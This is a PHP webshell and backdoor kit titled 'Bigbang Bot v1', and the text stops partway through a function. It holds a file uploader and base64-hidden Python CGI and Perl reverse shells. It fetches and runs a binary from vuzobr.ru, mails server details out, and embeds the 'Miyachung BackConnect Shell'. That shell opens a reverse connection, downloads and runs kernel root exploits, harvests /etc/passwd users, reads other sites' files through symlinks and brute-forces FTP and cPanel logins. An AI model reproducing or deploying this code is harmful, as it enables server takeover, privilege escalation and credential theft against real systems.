<?php if(isset($_GET["shell"])){echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]";echo"<br><font color=#FFFFFF>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?>
<title>Bigbang Bot v1</title><center><div id=q>Bigbang Bot<br><font color="#009900" size="3"><pre><img border="0" src="style.jpg" width="0" height="0"></pre><style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}
<?php if(isset($_GET["python"])){
@mkdir("prote");
@chdir("prote");
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "Options +ExecCGI
DirectoryIndex sen.za
AddHandler cgi-script .za";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$azx = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBBIHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBDb3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZvciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMgY29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQgZm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9ydCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBzdHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZyb20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAwNCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUgPSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1FVEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxlcwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIiIlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20gaXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUuZy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0gd2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3NpbmcgaXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAgICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3JtW2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZvcm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMgPSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9yIGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAgICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZlcnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAsICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyArIHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAgICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJsYW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3JtaGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAgICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRvdXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHByaW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJTygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZhbHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAgICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpDSEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBwcm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';

$file = fopen("sen.za" ,"w+");
$write = fwrite ($file ,base64_decode($azx));
fclose($file);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CnVzZSBGaWxlSGFuZGxlOwokSVAgPSAkRU5We1JFTU9URV9BRERSfTsKJFBPUlQgPSAiMjIiOwpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKTsKY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRQT1JULGluZXRfYXRvbigkSVApKSk7ClNPQ0tFVC0+YXV0b2ZsdXNoKCk7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsIj4mU09DS0VUIik7CnN5c3RlbSgiL2Jpbi9zaCAtaSIpOw==';

$filex = fopen("c.pl" ,"w+");
$write = fwrite ($filex ,base64_decode($netcatshell));
fclose($filex);
    chmod("sen.za",0755);
}
?>
<?php if(isset($_GET["root"])){
@chdir("prote");
@ini_set('display_errors', 0);
echo '<title>Upload Files xSecurity</title>';
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}

$check2 = "izo" ;
$text2 = http_get('http://vuzobr.ru/modules/mod_allnews/tmpl/izo');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
echo $check2."</br>";
chmod("izo",0755);
cp("izo",prote/izo);
system("./izo izocans &");
}else 
echo "not exits";
echo "done .\n " ;



}
?>


	<form method="GET" action="">
		Site : <input type="text" name="izo" placeholder="send mail adres write">
		<input type="submit" name="submit" value="submit">
	</form>
	<br>
<?php
if (isset($_GET['submit'])) {
$email= $_GET['izo'] ;
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " 2023 0day |$ra44";
$from = "From: Result<admin@r00t.info";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
}
?>
<?php
$mode="cp";//????????????.
if($_REQUEST['back']!=$mode)
{
   echo "<iframe src=send width=100% height=100% frameborder=0></iframe> ";
exit;
}
?>
<?php
/*
===================================================================
        .__                      .__                          
  _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
 /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
|  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
|__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
      \/    \/          \/     \/     \/           \//_____/ 
===================================================================	  
. Miyachung BackConnect Shell
. Written by Miyachung
. Janissaries.Org
. Contact: miyachung@hotmail
. Video  : https://www.youtube.com/watch?v=sWUR9gt4ia0
Commands works with shell_exec() function

@ Options
- exploit = Automatic Search & Download & Run a local root exploit which matches with kernel release
- grabusr = Grab users from /etc/passwd and save into a file ( users )
- domains = List domains from /var/named
- getf    = Find and grab the name given file from all public_html dirs ( only works with /home/USER/public_html servers )
- catln   = Cat file with ln -s method
- index	  = Try copy the name given file to all public_html dirs ( only works with /home/USER/public_html servers )
- home	  = Change dir into home folder
- ftp	  = Performs ftp brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )
- cpanel  = Performs cpanel brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )
*/
ob_start();
$server_ip  = $_SERVER['SERVER_ADDR'];
$your_ip   = getenv('REMOTE_ADDR');
$your_port = 22;
$timeout   = 5;

if(!empty($server_ip) && !empty($your_ip) && !empty($your_port) && !empty($timeout))
{
$create = new BC($your_ip,$your_port,$server_ip,$timeout);
}
/*
@ Connection Class
*/
class BC
{
	private $your_ip;
	private $your_port;
	private $server_ip;
	private $timeout;
	private $homefolder;
	public function __construct($yip,$yp,$sip,$t)
	{
	$this->your_ip   = $yip;
	$this->your_port = $yp;
	$this->server_ip = $sip;
	$this->timeout	 = $t;
	print("<title>Miyachung BackConnect Shell</title>");
	print("<strong>Miyachung BackConnect Shell</strong>\n<br>");
	print("Your ip is <strong>$this->your_ip</strong>\n<br>");
	print("Your port is <strong>$this->your_port</strong>\n<br>");
	print("Server ip is <strong>$this->server_ip</strong>\n<br>");
	print("Timeout seconds <strong>$this->timeout</strong>\n\n<br><br>");

	print("Trying to create shell process <strong>$this->your_ip</strong> with <strong>$this->your_port</strong> on <strong>$this->server_ip</strong>\n<br>");
	ob_flush(); flush();
	$this->createshell();
	}
	private function createshell()
	{
	$socket = @fsockopen($this->your_ip,$this->your_port,$errno,$errstr,$this->timeout) or die("<font color='red'>Unfortunately could not spawn shell</font>\n<br>");
	print("<font color='green'>Shell process opened to <strong>$this->server_ip</strong> > <strong>$this->your_ip:$this->your_port</strong></font>\n<br>");
	ob_flush(); flush();
	fwrite($socket,"=============================================================");
	fwrite($socket,"
        .__                      .__                          
  _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
 /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
|  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
|__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
      \/    \/          \/     \/     \/           \//_____/ 
");
	fwrite($socket,"Welcome to the BackConnect Shell !!\n");
	fwrite($socket,"Written by Miyachung\n");
	fwrite($socket,"Informations\n");
	fwrite($socket,"------------------------------------------------\n");
	fwrite($socket,"uname -a: ".@shell_exec("uname -a"));
	fwrite($socket,"whoami: ".@shell_exec("whoami"));
	fwrite($socket,"id: ".@shell_exec("id"));
	fwrite($socket,"pwd: ".@shell_exec("pwd"));
	fwrite($socket,"@ Options\n\n");
	fwrite($socket,"- exploit = Automatic Search & Download & Run a local root exploit which matches with kernel release\n");
	fwrite($socket,"- grabusr = Grab users from /etc/passwd and save into a file ( users )\n");
	fwrite($socket,"- domains = List domains from /var/named\n");
	fwrite($socket,"- getf    = Find and grab the name given file from all public_html dirs ( only works with /home/USER/public_html servers )\n");
	fwrite($socket,"- catln   = Cat file with ln -s method\n");
	fwrite($socket,"- index	  = Try copy the name given file to all public_html dirs ( only works with /home/USER/public_html servers )\n");
	fwrite($socket,"- home	  = Change dir into home folder\n");
	fwrite($socket,"- ftp	  = Performs ftp brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
	fwrite($socket,"- cpanel  = Performs cpanel brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
	$this->homefolder = trim(@shell_exec("pwd"));
	fwrite($socket,"=============================================================\n");
	$result= @shell_exec("whoami");
	fwrite($socket,$result);
	print "<font color='green'>Command whoami;</font>\n";
	print $result;
	ob_flush(); flush();
	preg_match("#([0-9]).([0-9]).([0-9]+)-([a-z0-9]+)#si",@shell_exec("uname -r"),$version);
	$version1 = $version[0];
	$version2 = $version[1].".".$version[2].".".$version[3];
	print "<pre>";
	while(1)
	{
	$enter = fgets($socket);
	if(preg_match('#exit#',$enter)){fwrite($socket,"Process closed\n");exit("Process closed");}
	if(preg_match('#exploit#',$enter)){$this->search($version1,$socket);$this->search($version2,$socket);}
	if(preg_match('#grabusr#',$enter)){$this->grab_users($socket);}
	if(preg_match('#catln (.+)#',$enter,$file)){$this->catln($file[1],$socket);}
	if(preg_match('#index (.+)#',$enter,$file)){$this->index($file[1],$socket);}
	if(preg_match('#getf (.+)#',$enter,$file)){$this->getf($file[1],$socket);}
	if(preg_match('#ftp (.+)#',$enter,$file)){$this->ftp($file[1],$socket);}
	if(preg_match('#cpanel (.+)#',$enter,$file)){$this->cpanel($file[1],$socket);}
	if(preg_match('#domains#',$enter)){$this->domains($socket);}
	if(eregi('home',$enter)){chdir($this->homefolder);}
	if(strpos($enter,'cd ..')){
	$curr = getcwd();
	$explode = explode("/",$curr);
	$c = count($explode);
	unset($explode[$c-1]);
	$explode = array_values(array_filter($explode));
	$path	 = implode("/",$explode);
	$path	 = "/".$path;
	if(!chdir($path)){fwrite($socket,"Can't chdir into $path : Permission denied\n");}
	}
	elseif(preg_match('#cd (.+)#',$enter,$dir)){
	$curr = getcwd();
	if(preg_match("#\/#si",$dir[1]))
	{
	if(!chdir($dir[1])){fwrite($socket,"Can't chdir into $dir[1] : Permission denied\n");}
	}
	else
	{
	if(!chdir($curr."/".$dir[1])){fwrite($socket,"Can't chdir into $curr/$dir[1] : Permission denied\n");}
	}
	
	}
	$result= @shell_exec(trim($enter));
	fwrite($socket,$result);
	print "<font color='green'>Command ".trim($enter).";</font>\n";
	print $result;
	ob_flush(); flush();
	}
	print "</pre>";
	fclose($socket);
	}
	private function search($version,$socket)
	{
		fwrite($socket,"Release: $version\n");
		print("Release: $version\n<br>");
		ob_flush();flush();
		fwrite($socket,"Searching Exploit-DB for local root exploits..\n");
		print("Searching Exploit-DB for local root exploits..\n<br>");
		$exploit_db = $this->curl("http://www.exploit-db.com/search/?action=search&filter_description=$version");
		if(preg_match('/No results/si',$exploit_db))
		{
		fwrite($socket,"Not found any exploits\n");
		print("Not found any exploits\n<br>");
		ob_flush();flush();
		}
		else
		{
		fwrite($socket,"==================== Possible Exploits =====================\n");
		print("==================== Possible Exploits =====================\n<br>");
		ob_flush();flush();
		preg_match_all('#<td class="list_explot_description">(.*?)<\/td>#si',$exploit_db,$list);
		foreach($list[1] as $listx)
		{
		preg_match('#<a  href="(.*?)">(.*?)<\/a>#si',$listx,$exploit);
		fwrite($socket,"[+] ".$exploit[2]."\n");
		print("[+] ".$exploit[2]."\n<br>");
		fwrite($socket,"Trying pwn this server with this exploit\n");
		print("Trying pwn this server with this exploit\n<br>");
		fwrite($socket,"Downloading => ".$exploit[1]."\n");
		print("Downloading => ".$exploit[1]."\n<br>");
		ob_flush();flush();
		$download = $this->download($exploit[1]);
		if($download != false)
		{
		fwrite($socket,"File downloaded saved as $download\n");
		print("File downloaded saved as $download\n<br>");
		fwrite($socket,"Trying compile to $download file\n");
		print("Trying compile to $download file\n<br>");
		ob_flush();flush();
		$withoutc = str_replace(".c","",$download);
		@shell_exec("gcc $download -o $withoutc");
		if(file_exists($withoutc))
		{
		fwrite($socket,"File compiled\n");
		print("File compiled\n<br>");
		fwrite($socket,"Setting chmod options\n");
		print("Setting chmod options\n<br>");
		@shell_exec("chmod +x $withoutc");
		fwrite($socket,"Running exploit..!\n");
		print("Running exploit..!\n<br>");
		ob_flush();flush();
		@shell_exec("./$withoutc");
		}
		else
		{
		fwrite($socket,"File doesn't compile\n");
		print("File doesn't compile\n<br>");
		ob_flush();flush();
		}
		
		}
		else
		{
		fwrite($socket,"File doesn't download\n");
		print("File doesn't download\n<br>");
		ob_flush();flush();
		}
		
		}
		fwrite($socket,"==================== Possible Exploits =====================\n");
		print("==================== Possible Exploits =====================\n<br>");
		ob_flush();flush();
		}
		fwrite($socket,"Searching 1337day for local root exploits..\n");
		print("Searching 1337day for local root exploits..\n<br>");
		ob_flush();flush();
		$day1337 = $this->curl("http://www.1337day.com/search","agree=Ok&dong=$version&submit_search=Submit");
		preg_match_all("#<a href='/exploit/description/(.*?)'  >(.*?)<\/a>#si",$day1337,$exploits);
		if($exploits[1])
		{
		fwrite($socket,"==================== Possible Exploits =====================\n");
		print("==================== Possible Exploits =====================\n<br>");
		ob_flush();flush();
		foreach($exploits[1] as $i => $exploit)
		{
		fwrite($socket,"[+] ".$exploits[2][$i]."\n");
		print("[+] ".$exploits[2][$i]."\n<br>");
		fwrite($socket,"Trying pwn this server with this exploit\n");
		print("Trying pwn this server with this exploit\n<br>");
		$exploit_link = "http://www.1337day.com/exploit/$exploit";
		fwrite($socket,"Downloading => ".$exploit_link."\n");
		print("Downloading => ".$exploit_link."\n<br>");
		ob_flush();flush();
		$download = $this->day1337download($exploit_link);
		if($download != false)
		{
		fwrite($socket,"File downloaded saved as $download\n");
		print("File downloaded saved as $download\n<br>");
		fwrite($socket,"Trying compile to $download file\n");
		print("Trying compile to $download file\n<br>");
		ob_flush();flush();
		$withoutc = str_replace(".c","",$download);
		@shell_exec("gcc $download -o $withoutc");
		if(file_exists($withoutc))
		{
		fwrite($socket,"File compiled\n");
		print("File compiled\n<br>");
		fwrite($socket,"Setting chmod options\n");
		print("Setting chmod options\n<br>");
		@shell_exec("chmod +x $withoutc");
		fwrite($socket,"Running exploit..!\n");
		print("Running exploit..!\n<br>");
		ob_flush();flush();
		@shell_exec("./$withoutc");
		}
		else
		{
		fwrite($socket,"File doesn't compile\n");
		print("File doesn't compile\n<br>");
		ob_flush();flush();
		}
		
		}
		
		}
		fwrite($socket,"==================== Possible Exploits =====================\n");
		print("==================== Possible Exploits =====================\n<br>");
		ob_flush();flush();
		}
		else
		{
		fwrite($socket,"Not found any exploits\n");
		print("Not found any exploits\n<br>");
		ob_flush();flush();
		}
	}
	private function curl($site,$post=null)
	{
	$ch = curl_init();
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
	curl_setopt($ch,CURLOPT_URL,$site);
	if($post != null)
	{
	curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
	}
	$exec = curl_exec($ch);
	curl_close($ch);
	return $exec;
	}
	private function download($url)
	{
	preg_match('#\/exploits\/(.+)#si',$url,$filename);
	$filename = $filename[1].".c";
	$url	  = str_replace("exploits","download",$url);
	$openurl  = @file_get_contents($url);
	if($openurl && file_put_contents($filename,$openurl)){
	return $filename;
	}
	else
	{
	return false;
	}
	
	}
	private function day1337download($url)
	{
	preg_match('#\/exploit\/(.+)#si',$url,$filename);
	$filename = $filename[1].".c";
	$data	  = $this->curl($url,"agree=Ok");
	preg_match("#<pre class='brush: plain; tab-size: 8'>(.*?)<\/pre>#si",$data,$content);
	if(file_put_contents($filename,$content))
	{
	return $filename;
	}
	else
	{
	return false;
	}
	
	}
	private function grab_users($socket)
	{
	$read = file("/etc/passwd");
	$x0x  = "";
	foreach($read as $text)
	{
	$text = trim($text);
	$user = explode(":",$text);
	$user = $user[0];
	$xox .= $user."\r\n";
	fwrite($socket,$user."\n");
	print($user."\n");
	}
	fwrite($socket,"Grabbed ".count($read)." users from /etc/passwd\n");
	print("Grabbed ".count($read)." users from /etc/passwd\n");
	$save = $this->save_as("users",$xox,"wb");
	if($save){fwrite($socket,"Saved into file as 'users'\n");print("Saved into file as 'users'\n");}else{fwrite($socket,"Doesn't save into file\n");print("Doesn't save into file\n");}
	}
	private function catln($file,$socket)
	{
	$savefile = uniqid();
	@shell_exec("ln -s $file ".$savefile);
	if(file_exists($savefile))
	{
	fwrite($socket,file_get_contents($savefile));
	print(file_get_contents($savefile));
	fwrite($socket,"File name $savefile\n");
	print("File name $savefile\n");
	}
	else
	{
	fwrite($socket,"File doesn't read\n");
	print("File doesn't read\n");
	}
	
	}
	private function index($file,$socket)
	{
	$etc  = file('/etc/passwd');
	$count= 0;
	foreach($etc as $txt)
	{
	$txt = trim($txt);
	$user= explode(":",$txt);
	$user= $user[0];
	$path= "/home/$user/public_html/$file";
	@shell_exec("cp $file $path");
	if(file_exists($path))
	{
	fwrite($socket,"File created: ".$path."\n");
	print("File created: ".$path."\n");
	$count++;
	}
	
	}
	fwrite($socket,"Completed\n");
	print("Completed\n");
	fwrite($socket,"File copied into $count dirs\n");
	print("File copied into $count dirs\n");
	}
	private function getf($file,$socket)
	{
	$etc   = file('/etc/passwd');
	$count = 0; 
	foreach($etc as $txt)
	{
	$txt = trim($txt);
	$user= explode(":",$txt);
	$user= $user[0];
	$path= "/home/$user/public_html/$file";
	if(file_exists($path))
	{
	fwrite($socket,"File found: ".$path."\n");
	print("File found: ".$path."\n");
	$content = file_get_contents($path);
	if($content)
	{
	$save = $this->save_as($user."-".$file,$content);
	if($save){
	fwrite($socket,"File is readable,saved into file named $user-$file\n");
	print("File is readable,saved into file named $user-$file\n");
	$count++;
	}
	else
	{
	fwrite($socket,"File is readable but current dir is not writable\n");
	print("File is readable but current dir is not writable\n");
	}
	
	}
	else
	{
	@shell_exec("ln -s $path $user-$file");
	if(file_exists($user[0]."-".$file)){
	fwrite($socket,"File is read with ln -s method,saved into file named $user-$file\n");
	print("File is read with ln -s method,saved into file named $user-$file\n");
	$count++;
	}
	else
	{
	fwrite($socket,"File is not readable\n");
	print("File is not readable\n");
	}
	
	}
	
	}
	
	}
	fwrite($socket,"Grabbed $count files\n");
	print("Grabbed $count files\n");
	
	}
	private function domains($socket)
	{
	$x0x   = "";
	$c	   = 0;
	$path		= "/var/named";
	$dir_handle = @opendir($path);
	if($dir_handle)
	{
	while ($file = readdir($dir_handle)) 
	{
	if (!is_dir($path."/".$file) AND ($file != "..") AND ($file != ".")) { 
	$dosya = str_replace(".db","",$file);
	fwrite($socket,$dosya."\n");
	print($dosya."\n");
	$x0x .= $dosya."\r\n";
	$c++;
	}

	}
	$save = $this->save_as("d0mains",$x0x,"wb");
	if($save == false){fwrite($socket,"Got domains but can't save into a file this dir is not writable\n");print("Got domains but can't save into a file this dir is not writable\n");}
	else
	{
	fwrite($socket,"Grabbed $c domains\n");
	print("Grabbed $c domains\n");
	fwrite($socket,"Saved into 'd0mains'\n");
	print("Saved into 'd0mains'\n");
	}
	closedir($dir_handle);
	} 
	else
	{
	fwrite($socket,"Doesn't read /var/named\n");
	print("Doesn't read /var/named\n");
	}
	
	}
	private function ftp($wordlist,$socket)
	{
	fwrite($socket,"Starting ftp crack..\n");
	ob_flush();flush();
	$open = file($wordlist);
	$userx= array();
	foreach($open as $pwd)
	{
	$pwd = trim($pwd);
	fwrite($socket,"Password ".$pwd." trying on all users\n");
	ob_flush();flush();
	$users= file('/etc/passwd');
	foreach($users as $user)
	{
	$user = trim($user);
	$user = explode(":",$user);
	$user = $user[0];
	$userx[] = $user;
	}
	$userx = array_filter($userx);
	$userx = array_unique($userx);
	$userx = array_chunk($userx,25);
	$multi = curl_multi_init();
	foreach($userx as $u)
	{
		for($i=0;$i<=count($u)-1;$i++)
		{
		$curl[$i] = curl_init();
		curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
		curl_setopt($curl[$i],CURLOPT_URL,"ftp://".$this->server_ip);
		curl_setopt($curl[$i],CURLOPT_USERPWD,trim($u[$i]).":".$pwd);
		curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,1);
		curl_setopt($curl[$i],CURLOPT_TIMEOUT,4);
		curl_multi_add_handle($multi,$curl[$i]);
		}
		do
		{
		curl_multi_exec($multi,$active);
		usleep(1);
		}while($active>0);
		foreach($curl as $cid => $cend)
		{
		$data[$cid] = curl_multi_getcontent($cend);
		if(preg_match('#drw#si',$data[$cid]))
		{
		fwrite($socket,"Found username: $u[$cid] , password: $pwd\n");
		print("<font color='red'>Found username: $u[$cid] , password: $pwd</font>\n");
		$save = $this->save_as("ftps.txt","Found username: $u[$cid] , password: $pwd\r\n","ab");
		ob_flush();flush();
		}
		else
		{
		fwrite($socket,"Not found $u[$cid]:$pwd\n");
		print("Not found $u[$cid]:$pwd\n");
